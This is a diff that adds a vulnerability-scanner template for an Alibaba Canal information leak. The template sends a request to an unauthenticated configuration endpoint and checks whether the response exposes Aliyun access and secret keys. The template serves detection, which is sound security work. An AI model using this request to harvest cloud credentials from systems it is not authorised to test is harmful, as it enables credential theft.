@@ -1,0 +1,22 @@
+id: alibaba-canal-info-leak
+donce: true
+info:
+  name: Alibaba Canal Info Leak
+  risk: Medium
+
+params:
+  - root: "{{.BaseURL}}"
+
+requests:
+  - method: GET
+    redirect: false
+    headers:
+      - User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3984.0 Safari/537.36
+    url: >-
+      {{.root}}/api/v1/canal/config/1/1
+    detections:
+      - >-
+        StatusCode() == 200 && RegexSearch("resHeaders", "application/json") && StringSearch("body", 'ncanal.aliyun.accessKey') && StringSearch("body", 'ncanal.aliyun.secretKey') && !RegexSearch("body", "(?i)(\<\!doctype|\<html|\<head|\<body)")
+
+references:
+  - link: https://github.com/alibaba/canal/issues/632
